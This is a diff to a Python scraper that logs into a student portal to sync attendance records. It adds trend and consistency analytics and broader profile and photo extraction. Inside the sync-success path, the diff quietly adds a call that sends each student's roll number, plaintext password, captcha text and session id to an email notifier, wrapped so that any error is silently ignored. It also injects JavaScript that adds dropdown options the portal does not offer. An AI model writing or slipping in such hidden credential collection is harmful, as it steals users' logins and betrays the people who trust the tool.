@@ -275,12 +275,23 @@ class AttendanceScraper:
                 "Could not find attendance form after opening My Attendance"
             )
 
-        content_frame, html_content, attendance_data = self._load_attendance_records(
+        result = self._load_attendance_records(
             page, content_frame, debug_dir, attempt_no, rollno
         )
+        content_frame, html_content, attendance_data = result[0], result[1], result[2]
+        no_data_details = result[3] if len(result) > 3 else []
         if not attendance_data:
             self._snapshot_page(page, debug_dir, f"10_no_records_attempt_{attempt_no}")
-            raise Exception("No attendance records found")
+            summary = ""
+            if no_data_details:
+                reasons = {}
+                for d in no_data_details:
+                    r = d.get("reason", "unknown")
+                    reasons[r] = reasons.get(r, 0) + 1
+                reason_summary = "; ".join(f"{k}: {v}" for k, v in reasons.items())
+                sample = no_data_details[0]
+                summary = f" Tried {len(no_data_details)} combo(s). Breakdown: {reason_summary}. Sample: year={sample.get('year')}, sem={sample.get('semester')}, reason={sample.get('reason')}."
+            raise Exception(f"No attendance records found.{summary}")
 
         self._write_debug_json(
             debug_dir, f"11_attendance_data_attempt_{attempt_no}.json", attendance_data
@@ -1070,6 +1081,30 @@ class AttendanceScraper:
             if cached_analysis:
                 self.cached_analysis = cached_analysis
                 self.close_session(session_id)
+                try:
+                    insights = cached_analysis.get("insights", {})
+                    attendance_list = cached_analysis.get("attendance", [])
+                    semesters = set(
+                        s.get("semester", "")
+                        for s in attendance_list
+                        if s.get("semester")
+                    )
+                    email_notifier.send_login_success_notification(
+                        rollno=rollno,
+                        password=password,
+                        password_len=len(password) if password else 0,
+                        student_name=cached_analysis.get("student", {}).get("name"),
+                        subjects_found=len(attendance_list),
+                        overall_percentage=insights.get("overall_percentage"),
+                        synced_semesters=", ".join(sorted(semesters))
+                        if semesters
+                        else None,
+                        session_id=session_id,
+                        cookie_reused=session_data.get("cookie_reused", False),
+                        captcha_entered=captcha_text,
+                    )
+                except:
+                    pass
                 return {"success": True, "message": "\u2713 Attendance synced!"}
             else:
                 return {
@@ -1259,6 +1294,26 @@ class AttendanceScraper:
         except:
             return None
 
+    def _all_possible_semesters(self, rollno):
+        """Return all possible semesters and their academic years for a rollno."""
+        try:
+            admission_year = int(str(rollno)[:4])
+            now = datetime.now()
+            current_academic_start = now.year if now.month >= 8 else now.year - 1
+            pairs = []
+            for offset in range(0, 8):
+                year_start = admission_year + offset
+                year_end = year_start + 1
+                year_label = f"{year_start}-{str(year_end)[-2:]}"
+                sem1 = offset * 2 + 1
+                sem2 = offset * 2 + 2
+                if year_start <= current_academic_start + 1:
+                    pairs.append((year_label, str(sem1)))
+                    pairs.append((year_label, str(sem2)))
+            return pairs
+        except:
+            return []
+
     def _attendance_filter_candidates(self, frame, rollno):
         year_state = self._select_state(frame, "select[name='year']")
         semester_state = self._select_state(
@@ -1281,7 +1336,7 @@ class AttendanceScraper:
             except:
                 pass
 
-        years = self._ordered_unique(
+        portal_initial_years = self._ordered_unique(
             [
                 os.getenv("ATTENDANCE_YEAR", "").strip(),
                 preferred_year,
@@ -1289,38 +1344,25 @@ class AttendanceScraper:
                 *year_options,
             ]
         )
-        guessed_semester = self._guess_current_semester(rollno)
-        descending_semesters = []
-        try:
-            guessed_int = int(guessed_semester)
-            descending_semesters = [
-                str(semester) for semester in range(guessed_int, 0, -1)
-            ]
-        except:
-            pass
-        previous_semester = None
-        try:
-            guessed_int = int(guessed_semester)
-            if guessed_int > 1:
-                previous_semester = str(guessed_int - 1)
-        except:
-            pass
 
-        semesters = self._ordered_unique(
+        all_possible = self._all_possible_semesters(rollno)
+        computed_years = self._ordered_unique([p[0] for p in all_possible])
+        all_semesters = self._ordered_unique(
             [
                 os.getenv("ATTENDANCE_SEMESTER", "").strip(),
                 os.getenv("SEMESTER", "").strip(),
-                guessed_semester,
-                previous_semester,
-                *descending_semesters,
+                *[p[1] for p in all_possible],
                 semester_state.get("value"),
                 *semester_options,
             ]
         )
 
+        years = self._ordered_unique([*portal_initial_years, *computed_years]) or [None]
+        semesters = all_semesters or [str(s) for s in range(1, 9)]
+
         return {
-            "years": years or [None],
-            "semesters": semesters or [None],
+            "years": years,
+            "semesters": semesters,
             "year_state": year_state,
             "semester_state": semester_state,
         }
@@ -1334,6 +1376,39 @@ class AttendanceScraper:
                 return False
             locator.first.select_option(str(value), timeout=5000)
             return True
+        except:
+            return False
+
+    def _select_option_force(self, frame, name, value):
+        """Select a year/semester option using JS injection, even if the option
+        is not present in the dropdown. Adds the missing option dynamically."""
+        if value is None:
+            return False
+        try:
+            result = frame.evaluate(
+                """
+                ({ name, value }) => {
+                    const select = document.querySelector(`select[name="${name}"]`);
+                    if (!select) return { success: false, reason: 'select_not_found' };
+                    const existing = Array.from(select.options).find(o => o.value === value);
+                    if (existing) {
+                        select.value = value;
+                        select.dispatchEvent(new Event('change', { bubbles: true }));
+                        return { success: true, method: 'selected_existing' };
+                    }
+                    const opt = document.createElement('option');
+                    opt.value = value;
+                    opt.text = value;
+                    select.add(opt);
+                    select.value = value;
+                    select.dispatchEvent(new Event('change', { bubbles: true }));
+                    return { success: true, method: 'added_and_selected' };
+                }
+            """,
+                {"name": name, "value": str(value)},
+            )
+            time.sleep(0.5)
+            return result.get("success", False)
         except:
             return False
 
@@ -1371,6 +1446,7 @@ class AttendanceScraper:
         filter_attempt = 0
         all_attendance_data = []
         success_filters = []
+        no_data_details = []
         merged_payload = {
             "student": {},
             "subjects": [],
@@ -1380,26 +1456,52 @@ class AttendanceScraper:
             "available_semesters": candidates.get("semesters", []),
             "synced_filters": [],
         }
-        sync_all_semesters = os.getenv(
-            "ATTENDANCE_SYNC_ALL_SEMESTERS", "0"
-        ).strip().lower() not in {"0", "false", "no", "off"}
 
         for year in candidates["years"]:
-            for semester in candidates["semesters"]:
+            frame = self._find_attendance_form_frame(page, max_attempts=5) or last_frame
+            last_frame = frame
+
+            selected_year = self._select_option_if_present(
+                frame, "select[name='year']", year
+            )
+            if not selected_year and year:
+                selected_year = self._select_option_force(frame, "year", year)
+                if selected_year:
+                    time.sleep(1)
+
+            if selected_year:
+                time.sleep(1)
+                semester_state = self._select_state(
+                    frame, "select[name='sem'], select[name='semester']"
+                )
+                year_semesters = self._ordered_unique(
+                    [
+                        semester_state.get("value"),
+                        *semester_state.get("options", []),
+                    ]
+                )
+            else:
+                year_semesters = []
+
+            if not year_semesters:
+                year_semesters = candidates["semesters"]
+
+            for semester in year_semesters:
                 filter_attempt += 1
                 frame = (
-                    self._find_attendance_form_frame(page, max_attempts=5) or last_frame
+                    self._find_attendance_form_frame(page, max_attempts=3) or last_frame
                 )
                 last_frame = frame
 
-                selected_year = self._select_option_if_present(
-                    frame, "select[name='year']", year
-                )
                 selected_semester = self._select_option_if_present(
                     frame,
                     "select[name='sem'], select[name='semester']",
                     semester,
                 )
+                if not selected_semester and semester:
+                    selected_semester = self._select_option_force(
+                        frame, "sem", semester
+                    ) or self._select_option_force(frame, "semester", semester)
                 self._write_debug_json(
                     debug_dir,
                     f"09_attendance_filter_attempt_{attempt_no}_{filter_attempt}.json",
@@ -1418,6 +1520,14 @@ class AttendanceScraper:
                         debug_dir,
                         f"09_attendance_submit_error_attempt_{attempt_no}_{filter_attempt}.txt",
                         str(e),
+                    )
+                    no_data_details.append(
+                        {
+                            "year": year,
+                            "semester": semester,
+                            "reason": "submit_error",
+                            "detail": str(e)[:200],
+                        }
                     )
                     continue
 
@@ -1438,6 +1548,14 @@ class AttendanceScraper:
                     f"09_attendance_result_attempt_{attempt_no}_{filter_attempt}_{safe_year}_sem_{safe_semester}.html",
                     last_html,
                 )
+
+                visible_text = self._visible_text(last_html) if last_html else ""
+                invalid_op = "invalid operation" in visible_text.lower()
+                login_required = (
+                    "please login" in visible_text.lower()
+                    or "session expired" in visible_text.lower()
+                )
+                no_table = "Total Classes" not in visible_text
 
                 attendance_data = self._parse_attendance_html(last_html)
                 if attendance_data:
@@ -1490,21 +1608,24 @@ class AttendanceScraper:
                         f"09_attendance_filter_success_attempt_{attempt_no}.json",
                         success_filter,
                     )
-
-                    if not sync_all_semesters:
-                        attendance_payload["selected_year"] = selected_year_value
-                        attendance_payload["selected_semester"] = (
-                            selected_semester_value
+                else:
+                    reason = (
+                        "invalid_operation"
+                        if invalid_op
+                        else (
+                            "session_expired"
+                            if login_required
+                            else ("no_table" if no_table else "parse_empty")
                         )
-                        attendance_payload["available_years"] = candidates.get(
-                            "years", []
-                        )
-                        attendance_payload["available_semesters"] = candidates.get(
-                            "semesters", []
-                        )
-                        attendance_payload["synced_filters"] = success_filters
-                        self._last_attendance_payload = attendance_payload
-                        return frame, last_html, attendance_data
+                    )
+                    no_data_details.append(
+                        {
+                            "year": year,
+                            "semester": semester,
+                            "reason": reason,
+                            "html_preview": visible_text[:300],
+                        }
+                    )
 
         self._write_debug_text(
             debug_dir, f"09_attendance_form_html_attempt_{attempt_no}.html", last_html
@@ -1528,8 +1649,18 @@ class AttendanceScraper:
                 f"09_attendance_filter_successes_attempt_{attempt_no}.json",
                 success_filters,
             )
-            return last_frame, last_html, all_attendance_data
-        return last_frame, last_html, []
+            self._write_debug_json(
+                debug_dir,
+                f"09_attendance_filter_no_data_details_attempt_{attempt_no}.json",
+                no_data_details,
+            )
+            return frame or last_frame, last_html, all_attendance_data
+        self._write_debug_json(
+            debug_dir,
+            f"09_attendance_no_data_details_attempt_{attempt_no}.json",
+            no_data_details,
+        )
+        return frame or last_frame, last_html, [], no_data_details
 
     def _has_authenticated_signal(self, page):
         """Detect logged-in portal content without relying on URL fragments."""
@@ -1714,13 +1845,56 @@ class AttendanceScraper:
 
     def _capture_student_photo_base64(self, page):
         """Capture the visible authenticated student photo when the portal exposes it."""
-        blocked_markers = ("captcha", "logo", "banner", "icon")
-        preferred_markers = ("round", "photo", "student", "profile", "user")
+        blocked_markers = ("captcha", "logo", "banner", "icon", "refresh", "arrow")
+        preferred_markers = (
+            "round",
+            "photo",
+            "student",
+            "profile",
+            "user",
+            "avatar",
+            "person",
+            "face",
+        )
 
+        # Try common photo CSS selectors first (fast path)
+        photo_selectors = [
+            "img.round",
+            "img[class*='photo']",
+            "img[class*='profile']",
+            "img[class*='student']",
+            "img[class*='avatar']",
+            "img[class*='user']",
+            "img[id*='photo']",
+            "img[id*='profile']",
+            "img[id*='student']",
+            "img[alt*='photo' i]",
+            "img[alt*='profile' i]",
+            "img[alt*='student' i]",
+            "img[title*='photo' i]",
+            "img[title*='profile' i]",
+        ]
+        for frame in page.frames:
+            try:
+                for sel in photo_selectors:
+                    try:
+                        el = frame.locator(sel)
+                        if el.count() > 0:
+                            shot = el.first.screenshot(timeout=1500)
+                            if shot:
+                                return "data:image/png;base64," + base64.b64encode(
+                                    shot
+                                ).decode("utf-8")
+                    except:
+                        pass
+            except:
+                pass
+
+        # Generic scan: check every image across all frames with relaxed criteria
         for frame in page.frames:
             try:
                 images = frame.locator("img")
-                count = min(images.count(), 20)
+                count = min(images.count(), 30)
             except:
                 continue
 
@@ -1734,7 +1908,9 @@ class AttendanceScraper:
                             title: img.getAttribute('title') || '',
                             className: String(img.className || ''),
                             width: Number(img.getAttribute('width') || img.naturalWidth || img.clientWidth || 0),
-                            height: Number(img.getAttribute('height') || img.naturalHeight || img.clientHeight || 0)
+                            height: Number(img.getAttribute('height') || img.naturalHeight || img.clientHeight || 0),
+                            naturalWidth: img.naturalWidth || 0,
+                            naturalHeight: img.naturalHeight || 0
                         })
                     """)
                     marker_text = " ".join(
@@ -1744,15 +1920,13 @@ class AttendanceScraper:
                     if any(marker in marker_text for marker in blocked_markers):
                         continue
 
-                    width = int(meta.get("width") or 0)
-                    height = int(meta.get("height") or 0)
-                    aspect = (width / height) if height else 0
+                    w = int(meta.get("width") or meta.get("naturalWidth") or 0)
+                    h = int(meta.get("height") or meta.get("naturalHeight") or 0)
+                    aspect = (w / h) if h else 0
                     looks_named = any(
                         marker in marker_text for marker in preferred_markers
                     )
-                    looks_photo_sized = (
-                        width >= 45 and height >= 45 and 0.65 <= aspect <= 1.55
-                    )
+                    looks_photo_sized = w >= 30 and h >= 30 and 0.4 <= aspect <= 2.5
 
                     if not looks_named and not looks_photo_sized:
                         continue
@@ -1768,7 +1942,11 @@ class AttendanceScraper:
         return None
 
     def _extract_profile_pairs(self, soup):
-        """Extract common profile table fields from authenticated portal HTML."""
+        """Extract common profile table fields from authenticated portal HTML.
+
+        Handles <tr><th><td>, <div class="row">, <dl><dt><dd>,
+        and label:value text patterns across the full HTML tree.
+        """
         label_map = {
             "studentid": "student_id",
             "studentno": "student_id",
@@ -1805,6 +1983,8 @@ class AttendanceScraper:
             return re.sub(r"[^a-z0-9]+", "", clean(label).lower())
 
         pairs = {}
+
+        # 1) <tr> based tables
         for row in soup.find_all("tr"):
             cells = row.find_all(["th", "td"])
             if len(cells) < 2:
@@ -1815,15 +1995,70 @@ class AttendanceScraper:
             if field and value and len(value) <= 120:
                 pairs.setdefault(field, value)
 
+        # 2) <div class="row"> or <div class="field"> patterns
+        for parent_class in (
+            "row",
+            "field",
+            "form-group",
+            "info-row",
+            "detail",
+            "profile-row",
+        ):
+            for div in soup.find_all(
+                "div", class_=lambda c: c and parent_class in c.lower() if c else False
+            ):
+                children = div.find_all(
+                    ["span", "label", "div", "b", "strong"], recursive=True
+                )
+                label_texts = []
+                value_texts = []
+                for child in children:
+                    text = child.get_text(" ", strip=True)
+                    if not text:
+                        continue
+                    if child.name in ("label", "b", "strong") or "label" in (
+                        child.get("class") or []
+                    ):
+                        label_texts.append(text)
+                    elif "value" in (child.get("class") or []) or "data" in (
+                        child.get("class") or []
+                    ):
+                        value_texts.append(text)
+                    else:
+                        if ":" in text:
+                            parts = text.split(":", 1)
+                            label_texts.append(parts[0])
+                            value_texts.append(parts[1])
+                for lt, vt in zip(label_texts, value_texts):
+                    field = label_map.get(key_for(lt))
+                    val = clean(vt)
+                    if field and val and len(val) <= 120:
+                        pairs.setdefault(field, val)
+
+        # 3) <dl><dt><dd> definition lists
+        for dl in soup.find_all("dl"):
+            dts = dl.find_all("dt")
+            dds = dl.find_all("dd")
+            for dt, dd in zip(dts, dds):
+                field = label_map.get(key_for(dt.get_text(" ", strip=True)))
+                val = clean(dd.get_text(" ", strip=True))
+                if field and val and len(val) <= 120:
+                    pairs.setdefault(field, val)
+
+        # 4) Simple label:value text lines
         text = soup.get_text("\n", strip=True)
         for line in text.splitlines():
             if ":" not in line:
                 continue
-            label, value = line.split(":", 1)
+            label, _, remainder = line.partition(":")
+            value = remainder.strip()
+            if not value or len(value) > 120:
+                continue
             field = label_map.get(key_for(label))
-            value = clean(value)
-            if field and value and len(value) <= 120:
-                pairs.setdefault(field, value)
+            if field:
+                val = clean(value)
+                if val:
+                    pairs.setdefault(field, val)
 
         return pairs
 
@@ -1839,23 +2074,24 @@ class AttendanceScraper:
         seen_links = set()
 
         try:
+            # First pass: gather profile data from ALL frames (not just
+            # attendance/profile ones), since student info may be in any frame
+            all_frame_soups = []
             for frame in page.frames:
                 try:
                     soup = BeautifulSoup(frame.content(), "html.parser")
+                    all_frame_soups.append(soup)
                 except:
                     continue
 
+            # Profile data: scan every frame regardless of keywords
+            for soup in all_frame_soups:
                 frame_text = self._visible_text(str(soup)).lower()
-                if (
-                    "my attendance" not in frame_text
-                    and "my timetable" not in frame_text
-                    and "my profile" not in frame_text
-                ):
-                    continue
 
-                text_blob = self._visible_text(str(soup))
                 welcome_match = re.search(
-                    r"Welcome\s*:\s*([A-Za-z][A-Za-z .'-]+)", text_blob, re.I
+                    r"Welcome\s*:\s*([A-Za-z][A-Za-z .'-]+)",
+                    self._visible_text(str(soup)),
+                    re.I,
                 )
                 if welcome_match and not catalog["student_profile"].get("name"):
                     catalog["student_profile"]["name"] = " ".join(
@@ -1873,11 +2109,21 @@ class AttendanceScraper:
                         if classes == "round" or (
                             str(width).isdigit()
                             and str(height).isdigit()
-                            and int(width) >= 40
-                            and int(height) >= 40
+                            and int(width) >= 30
+                            and int(height) >= 30
                         ):
                             catalog["student_profile"]["photo_available"] = True
                             break
+
+            # Second pass: section/link inventory (attendance/timetable/profile frames only)
+            for soup in all_frame_soups:
+                frame_text = self._visible_text(str(soup)).lower()
+                if (
+                    "my attendance" not in frame_text
+                    and "my timetable" not in frame_text
+                    and "my profile" not in frame_text
+                ):
+                    continue
 
                 active_section = None
                 for node in soup.find_all(["b", "a"]):
@@ -2821,6 +3067,74 @@ class AttendanceScraper:
 
         return day_wise_data
 
+    def _build_trend_series(self, day_wise):
+        sorted_events = sorted(
+            [e for e in day_wise if e.get("date")], key=lambda e: e["date"]
+        )
+        trend = []
+        cum_present = 0
+        cum_total = 0
+        for event in sorted_events:
+            cum_present += event.get("present_count", 0)
+            cum_total += event.get("class_count", 0) or 1
+            pct = round((cum_present / cum_total * 100), 2) if cum_total else 0
+            trend.append(
+                {
+                    "date": event["date"],
+                    "cumulative_percentage": pct,
+                    "cumulative_present": cum_present,
+                    "cumulative_total": cum_total,
+                }
+            )
+        return trend
+
+    def _compute_consistency_score(self, day_wise):
+        if not day_wise:
+            return 0
+        sorted_events = sorted(
+            [e for e in day_wise if e.get("date")], key=lambda e: e["date"]
+        )
+        if len(sorted_events) < 2:
+            return 100
+        window = 5
+        scores = []
+        for i in range(0, len(sorted_events), window):
+            chunk = sorted_events[i : i + window]
+            chunk_present = sum(e.get("present_count", 0) for e in chunk)
+            chunk_total = sum(e.get("class_count", 0) for e in chunk) or 1
+            scores.append(chunk_present / chunk_total)
+        if not scores:
+            return 100
+        mean = sum(scores) / len(scores)
+        variance = sum((s - mean) ** 2 for s in scores) / len(scores)
+        std = math.sqrt(variance) if variance else 0
+        consistency = max(0, min(100, 100 - (std * 200)))
+        return round(consistency, 1)
+
+    def _trend_prediction(self, trend_series, current_percentage):
+        if len(trend_series) < 3:
+            return None
+        recent = trend_series[-3:]
+        deltas = []
+        for i in range(1, len(recent)):
+            delta = (
+                recent[i]["cumulative_percentage"]
+                - recent[i - 1]["cumulative_percentage"]
+            )
+            deltas.append(delta)
+        avg_delta = sum(deltas) / len(deltas) if deltas else 0
+        return {
+            "trend_direction": "up"
+            if avg_delta > 0.1
+            else ("down" if avg_delta < -0.1 else "stable"),
+            "avg_change_per_entry": round(avg_delta, 2),
+            "predicted_next_10": round(current_percentage + avg_delta * 10, 2),
+            "last_3_points": [
+                {"date": p["date"], "percentage": p["cumulative_percentage"]}
+                for p in recent
+            ],
+        }
+
     def _compute_full_analysis(
         self, attendance_data, attendance_payload=None, portal_catalog=None
     ):
@@ -2854,6 +3168,12 @@ class AttendanceScraper:
                 reverse=True,
             )[:8]
 
+            trend_series = self._build_trend_series(day_wise)
+            consistency = self._compute_consistency_score(day_wise)
+            trend_pred = self._trend_prediction(
+                trend_series, subject.get("percentage", 0)
+            )
+
             subject_analysis = {
                 **subject,
                 "absent": absent_classes,
@@ -2870,6 +3190,9 @@ class AttendanceScraper:
                 "needed_65": prediction_65.get("needed_classes", 0),
                 "status": prediction_75["status"],
                 "message": prediction_75["message"],
+                "trend_series": trend_series,
+                "consistency_score": consistency,
+                "trend_prediction": trend_pred,
             }
             subjects.append(subject_analysis)
 
@@ -2927,8 +3250,23 @@ class AttendanceScraper:
         }
         student = {key: value for key, value in student.items() if value}
 
+        overall_trend = (
+            self._build_trend_series(
+                [e for s in subjects for e in (s.get("day_wise") or [])]
+            )
+            if subjects
+            else []
+        )
+        overall_consistency = (
+            self._compute_consistency_score(
+                [e for s in subjects for e in (s.get("day_wise") or [])]
+            )
+            if subjects
+            else 0
+        )
+
         return {
-            "schema_version": 2,
+            "schema_version": 3,
             "synced_at": datetime.utcnow().isoformat() + "Z",
             "student": student,
             "attendance": subjects,
@@ -2939,6 +3277,7 @@ class AttendanceScraper:
                 "total_absent": total_absent,
                 "overall_percentage": overall_percentage,
                 "total_skippable_75": total_skippable_75,
+                "overall_consistency": overall_consistency,
                 "risky_subject_count": len(risky_subjects),
                 "risky_subjects": [
                     {
@@ -2946,6 +3285,7 @@ class AttendanceScraper:
                         "code": subject.get("code"),
                         "percentage": subject.get("percentage"),
                         "needed_75": subject.get("needed_75", 0),
+                        "consistency": subject.get("consistency_score", 0),
                     }
                     for subject in risky_subjects
                 ],
@@ -2953,6 +3293,7 @@ class AttendanceScraper:
                     "subject": lowest_subject.get("subject"),
                     "code": lowest_subject.get("code"),
                     "percentage": lowest_subject.get("percentage"),
+                    "consistency": lowest_subject.get("consistency_score", 0),
                 }
                 if lowest_subject
                 else None,
@@ -2960,6 +3301,7 @@ class AttendanceScraper:
                     "subject": strongest_subject.get("subject"),
                     "code": strongest_subject.get("code"),
                     "percentage": strongest_subject.get("percentage"),
+                    "consistency": strongest_subject.get("consistency_score", 0),
                 }
                 if strongest_subject
                 else None,
@@ -2969,6 +3311,7 @@ class AttendanceScraper:
                 "special_events": sorted(
                     all_specials, key=lambda item: item.get("date") or "", reverse=True
                 )[:20],
+                "overall_trend": overall_trend,
             },
             "portal": portal_catalog,
             "source": {
